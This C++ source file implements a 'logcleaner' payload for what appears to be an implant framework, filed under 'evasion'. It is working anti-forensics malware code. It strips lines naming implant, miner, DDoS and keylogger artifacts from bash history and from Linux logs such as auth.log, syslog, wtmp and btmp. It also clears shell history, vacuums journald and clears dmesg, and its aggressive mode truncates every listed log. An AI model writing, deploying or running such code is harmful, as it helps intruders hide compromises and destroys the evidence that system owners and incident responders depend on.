#include <sys/stat.h>
#include <unistd.h>

#include <cerrno>
#include <cctype>
#include <cstring>
#include <ctime>
#include <string>
#include <vector>

#include "snake/payloads.hpp"

namespace snake::payloads {
namespace {

using OJ = nlohmann::ordered_json;

const char* const kLogPatterns[] = {
    "rogue_implant", "rogue_agent", ".cache/.rogue", "polyloader",
    "ddos.py",       "mine.py",     "keylogger",     "screenshot",
};

const char* const kLinuxLogFiles[] = {
    "/var/log/auth.log", "/var/log/syslog",   "/var/log/messages", "/var/log/secure",
    "/var/log/kern.log", "/var/log/dmesg",    "/var/log/boot.log", "/var/log/cron",
    "/var/log/maillog",  "/var/log/lastlog",  "/var/log/wtmp",     "/var/log/btmp",
    "/var/log/faillog",
};

std::string lower(const std::string& s) {
    std::string out = s;
    for (char& c : out) c = (char)::tolower((unsigned char)c);
    return out;
}

bool matches_any(const std::string& line) {
    std::string l = lower(line);
    for (const char* p : kLogPatterns) {
        if (l.find(p) != std::string::npos) return true;
    }
    return false;
}

std::vector<std::string> split_nl(const std::string& s) {
    std::vector<std::string> out;
    size_t start = 0;
    for (;;) {
        size_t pos = s.find('\n', start);
        if (pos == std::string::npos) {
            out.push_back(s.substr(start));
            break;
        }
        out.push_back(s.substr(start, pos - start));
        start = pos + 1;
    }
    return out;
}

std::string join_nl(const std::vector<std::string>& v) {
    std::string out;
    for (size_t i = 0; i < v.size(); ++i) {
        if (i > 0) out += "\n";
        out += v[i];
    }
    return out;
}

std::string go_path_error(const std::string& op, const std::string& path, int err) {
    std::string msg;
    switch (err) {
        case EACCES: msg = "permission denied"; break;
        case EPERM: msg = "operation not permitted"; break;
        case ENOENT: msg = "no such file or directory"; break;
        case EISDIR: msg = "is a directory"; break;
        case ELOOP: msg = "too many levels of symbolic links"; break;
        case ENAMETOOLONG: msg = "file name too long"; break;
        default: {
            msg = std::strerror(err);
            for (char& c : msg) c = (char)::tolower((unsigned char)c);
        }
    }
    return op + " " + path + ": " + msg;
}

OJ operation(const std::string& file, const std::string& status, int removed,
             const std::string& error = "") {
    OJ op = OJ::object();
    op["file"] = file;
    op["status"] = status;
    op["removed"] = removed;
    if (!error.empty()) op["error"] = error;
    return op;
}

OJ clean_file(const std::string& path) {
    FILE* f = std::fopen(path.c_str(), "rb");
    if (f == nullptr) {
        int err = errno;
        if (err == ENOENT || err == ENOTDIR) return operation(path, "not_found", 0);
        return operation(path, "error", 0, go_path_error("open", path, err));
    }
    std::string data;
    char buf[8192];
    size_t n;
    while ((n = std::fread(buf, 1, sizeof(buf), f)) > 0) data.append(buf, n);
    bool read_failed = std::ferror(f) != 0;
    int read_err = errno;
    std::fclose(f);
    if (read_failed)
        return operation(path, "error", 0, go_path_error("read", path, read_err));

    std::vector<std::string> lines = split_nl(data);
    std::vector<std::string> kept;
    for (const auto& line : lines) {
        if (!matches_any(line)) kept.push_back(line);
    }
    int removed = (int)lines.size() - (int)kept.size();
    if (removed > 0) {
        mut_write(path + ".rogue_backup", data, 0600);
        mut_write(path, join_nl(kept), 0644);
        return operation(path, "cleaned", removed);
    }
    return operation(path, "no_matches", 0);
}

std::vector<OJ> clean_bash_history() {
    std::vector<OJ> ops;
    const char* home = getenv("HOME");
    std::string h = (home == nullptr || *home == '\0') ? ".bash_history"
                                                       : std::string(home) + "/.bash_history";
    ops.push_back(clean_file(h));
    ops.push_back(clean_file("/root/.bash_history"));

    mut_run_argv({"history", "-c"});
    mut_run_argv({"history", "-w"});
    return ops;
}

std::vector<OJ> clean_system_logs() {
    std::vector<OJ> ops;
    for (const char* f : kLinuxLogFiles) ops.push_back(clean_file(f));
    return ops;
}

std::vector<OJ> clean_memory_logs() {
    std::vector<OJ> ops;
    std::string jc = which_exe("journalctl");
    if (!jc.empty()) {
        if (mut_run_argv({"journalctl", "--vacuum-time=1s"}).ok) {
            mut_run_argv({"journalctl", "--rotate"});
            ops.push_back(operation("systemd_journal", "cleaned", 0));
        }
    }
    std::string dm = which_exe("dmesg");
    if (!dm.empty()) {
        if (mut_run_argv({"dmesg", "-c"}).ok) ops.push_back(operation("dmesg", "cleaned", 0));
    }
    return ops;
}

std::vector<OJ> aggressive_cleanup() {
    std::vector<OJ> ops;
    for (const char* f : kLinuxLogFiles) {
        bool is_dir = false;
        if (path_exists(f, is_dir)) {
            mut_truncate(f);
            ops.push_back(operation(f, "truncated", 0));
        }
    }
    return ops;
}

class LogCleaner : public Payload {
  public:
    const char* name() const override { return "logcleaner"; }
    const char* category() const override { return "evasion"; }
    const char* description() const override {
        return "Clean system logs (auth.log, syslog, journald, wtmp, btmp, bash_history)";
    }

    Output execute(const Args& args) const override {
        std::string level = "moderate";
        auto it = args.find("level");
        if (it != args.end() && !it->second.empty()) level = it->second;

        OJ r = OJ::object();
        r["timestamp"] = now_rfc3339();
        r["clean_level"] = level;

        std::vector<OJ> ops = clean_bash_history();
        if (level == "moderate" || level == "aggressive") {
            std::vector<OJ> sys = clean_system_logs();
            ops.insert(ops.end(), sys.begin(), sys.end());
        }
        if (level == "aggressive") {
            std::vector<OJ> mem = clean_memory_logs();
            ops.insert(ops.end(), mem.begin(), mem.end());
            std::vector<OJ> agg = aggressive_cleanup();
            ops.insert(ops.end(), agg.begin(), agg.end());
        }

        OJ arr = OJ::array();
        int total_removed = 0;
        int total_errors = 0;
        for (const OJ& op : ops) {
            total_removed += op.value("removed", 0);
            if (op.value("status", "") == "error") total_errors++;
            arr.push_back(op);
        }
        if (ops.empty())
            r["operations"] = nullptr;
        else
            r["operations"] = arr;

        OJ summary = OJ::object();
        summary["total_errors"] = total_errors;
        summary["total_lines_removed"] = total_removed;
        summary["total_operations"] = (int)ops.size();
        r["summary"] = summary;

        std::string s = MarshalJSON(r);
        return Output(s.begin(), s.end());
    }
};

LogCleaner g_logcleaner;

struct Reg { Reg() { Register(&g_logcleaner); } };
Reg g_reg;

}  // namespace
}  // namespace snake::payloads
